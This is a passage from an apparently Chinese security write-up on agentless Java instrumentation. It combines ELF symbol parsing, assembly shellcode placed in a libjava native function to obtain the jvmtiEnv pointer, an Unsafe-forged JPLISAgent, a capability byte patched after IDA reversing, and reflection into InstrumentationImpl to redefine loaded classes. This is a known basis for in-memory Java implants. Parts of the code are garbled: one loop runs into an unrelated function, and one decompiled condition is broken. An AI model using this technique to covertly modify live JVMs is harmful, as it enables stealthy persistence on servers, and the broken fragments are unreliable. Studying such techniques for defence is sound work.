        sh_type = Integer.reverseBytes(fin.readInt());
        sh_flags = Long.reverseBytes(fin.readLong());
        sh_addr = Long.reverseBytes(fin.readLong());
        sh_offset = Long.reverseBytes(fin.readLong());
        sh_size = Long.reverseBytes(fin.readLong());
        sh_link = Integer.reverseBytes(fin.readInt());
        sh_info = Integer.reverseBytes(fin.readInt());
        sh_addralign = Long.reverseBytes(fin.readLong());
        sh_entsize = Long.reverseBytes(fin.readLong());
        long symstr_shdr_sh_offset = sh_offset;
        long cnt = symtab_shdr_sh_entsize > 0 ? symtab_shdr_sh_size/symtab_shdr_sh_entsize : 0;
        for(long i = 0; i functions->GetEnv(vm, (void **)&_jvmti_env, JVMTI_VERSION_1_2);
        return _jvmti_env;
    }
转换为shellcode
    movabs  rax, _JNI_GetCreatedJavaVMs
    sub     rsp, 20h
    xor     rsi, rsi
    inc     rsi
    lea     rdx, [rsp+4]
    lea     rdi, [rsp+8]
    call    rax
    mov     rdi, [rsp+8]
    lea     rsi, [rsp+10h]
    mov     edx, 30010200h
    mov     rax, [rdi]
    call    qword ptr [rax+30h]
    mov     rax, [rsp+10h]
    add     rsp, 20h
    ret
后来我选择了libjava.so中的Java_java_io_RandomAccessFile_length。使用unsafe申请一段内存，并在偏移8（x64下指针长度为8）的位置上放置jvmtienv指针
    long JPLISAgent = unsafe.allocateMemory(0x1000);
    unsafe.putLong(JPLISAgent + 8, native_jvmtienv);
再通过反射最终得到InstrumentationImpl对象
    try {
        Class instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
        Constructor constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
        constructor.setAccessible(true);
        Object insn = constructor.newInstance(JPLISAgent, true, false);
        Method getAllLoadedClasses = instrument_clazz.getMethod("getAllLoadedClasses");
        Class[] clazzes = (Class[]) getAllLoadedClasses.invoke(insn);
        for(Class cls : clazzes) {
            System.out.println(cls.getName());
        }
    }catch(Exception e) {
        System.out.println("Exception: " + e.getMessage());
    }
需要注意的是，在Java11中sun.instrument包已不再可引用。这里已经可以获取所有加载的类。
## 意外
在正确查找得到jvmtienv指针之后，执行redefineClasses会报异常
    Java_java_io_RandomAccessFile_length 0x7fb29c485e40
    JNI_GetCreatedJavaVMs 0x7fb29d52b650
    native_jvmtienv 7fb2980ef070
    Exception: null
使用调试工具跟踪，在函数redefineClasses中会调用
    void
    redefineClasses(JNIEnv * jnienv, JPLISAgent * agent, jobjectArray classDefinitions) {
        jvmtiEnv*   jvmtienv                        = jvmti(agent);
        jboolean    errorOccurred                   = JNI_FALSE;
        jclass      classDefClass                   = NULL;
        jmethodID   getDefinitionClassMethodID      = NULL;
        ...
        if (!errorOccurred) {
                        jvmtiError  errorCode = JVMTI_ERROR_NONE;
                        errorCode = (*jvmtienv)->RedefineClasses(jvmtienv, numDefs, classDefs);
                        if (errorCode == JVMTI_ERROR_WRONG_PHASE) {
                            /* insulate caller from the wrong phase error */
                            errorCode = JVMTI_ERROR_NONE;
                        } else {
                            errorOccurred = (errorCode != JVMTI_ERROR_NONE);
                            if ( errorOccurred ) {
                                createAndThrowThrowableFromJVMTIErrorCode(jnienv, errorCode);
                            }
                        }
                    }
        ...
    }
这个(*jvmtienv)->RedefineClasses调用，暂时没找到源码，在IDA中逆向的结果如下
    __int64 __fastcall jvmti_RedefineClasses(JvmtiEnvBase *this, JavaThread *a2, __int64 a3)
    {
      int v4; // er15
      unsigned int v5; // er12
      void *v7; // rax
      unsigned __int64 v8; // r14
      unsigned __int64 v9; // rsi
      __int64 v10; // rbx
      _QWORD *v11; // rax
      _QWORD *v12; // r13
      signed __int32 v13; // [rsp+0h] [rbp-60h] BYREF
      CautiouslyPreserveExceptionMark *v14; // [rsp+8h] [rbp-58h]
      char v15[40]; // [rsp+10h] [rbp-50h] BYREF
      v4 = (int)a2;
      v5 = 112;
      if ( JvmtiEnvBase::_phase == 4 )
      {
        v7 = pthread_getspecific(ThreadLocalStorage::_thread_index);
        v8 = (unsigned __int64)v7;
        if ( v7 && (*(unsigned __int8 (__fastcall **)(void *))(*(_QWORD *)v7 + 40LL))(v7) )
        {
          *(_DWORD *)(v8 + 624) = 5;
          if ( os::_processor_count != 1 || AssumeMP )
          {
            if ( UseMembar )
            {
              if ( os::_processor_count != 1 || AssumeMP )
                _InterlockedAdd(&v13, 0);
            }
            else
            {
              *(_DWORD *)((char *)os::_mem_serialize_page
                        + ((unsigned int)(v8 >> 4) & (unsigned int)os::_serialize_page_mask)) = 1;
            }
          }
          if ( SafepointSynchronize::_state || (*(_DWORD *)(v8 + 48) & 0x30000000) != 0 )
            JavaThread::check_safepoint_and_suspend_for_native_trans((JavaThread *)v8, a2);
          *(_DWORD *)(v8 + 624) = 6;
          v9 = v8;
          v5 = 116;
          v14 = (CautiouslyPreserveExceptionMark *)v15;
          CautiouslyPreserveExceptionMark::CautiouslyPreserveExceptionMark(
            (CautiouslyPreserveExceptionMark *)v15,
            (Thread *)v8);
          if ( (unsigned __int8)JvmtiEnvBase::is_valid(this) )
          {
            v5 = 99;
            if ( (*((_BYTE *)this + 361) & 2) != 0 )   = 0 )
              {
                v5 = 100;
                if ( a3 )
                {
                  v9 = (unsigned int)v4;
                  v5 = JvmtiEnv::RedefineClasses(this, (unsigned int)v4, a3);
                }
              }
            }
        ...
    }
因此需要用unsafe设置一下
    unsafe.putByte(native_jvmtienv + 361, (byte) 2);
## 测试
修改java.io.RandomAccessFile的getFD方法，插入打印语句
    public static void main(String[] args) {
        ClassPool pool = ClassPool.getDefault();
        CtClass string_clazz = null;
        try {
            string_clazz = pool.get("java.io.RandomAccessFile");
            CtMethod method_getname = string_clazz.getDeclaredMethod("getFD");
            method_getname.insertBefore("System.out.println(\"hi, from java instrucment api\");");
            string_clazz.writeFile("D:\\1.txt");
        } catch (NotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (CannotCompileException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
从1.txt文件夹里读取类的字节码
    try {
        Class instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
        Constructor constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
        constructor.setAccessible(true);
        Object inst = constructor.newInstance(JPLISAgent, true, false);
        //修改过的java.io.RandomAccessFile
        byte hexData[] = {
                ... //太长省略 
        };
        ClassDefinition definition = new ClassDefinition(Class.forName("java.io.RandomAccessFile"), hexData);
        Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
        redefineClazz.invoke(inst, new Object[] {
                new ClassDefinition[] {
                        definition
                        }
                });
    }catch(Exception e) {
        System.out.println("Exception: " + e.getMessage());
    }
    fout.getFD();
正确输出结果
    Java_java_io_RandomAccessFile_length 0x7fd720689e40
    JNI_GetCreatedJavaVMs 0x7fd72172f650
    native_jvmtienv 7fd71c0e71d0
    hi, from java instrucment api
完整代码请参考：
## 结语
要在不提供agent文件的条件下完成Java Instrument，有如下步骤：
  1. 解析ELF，得到Java_java_io_RandomAccessFile_length和JNI_GetCreatedJavaVMs 
  2. 生成利用JNI_GetCreatedJavaVMs获取jvmtienv指针的shellcode 
  3. 在Java_java_io_RandomAccessFile_length放置shellcode并调用 
  4. 恢复Java_java_io_RandomAccessFile_length代码 
  5. 利用unsafe伪造agent实例 
  6. 利用反射实例化sun.instrument.InstrumentationImpl 
  7. 使用此对象修改类 
## 参考
rebeyond 《Java内存攻击技术漫谈》  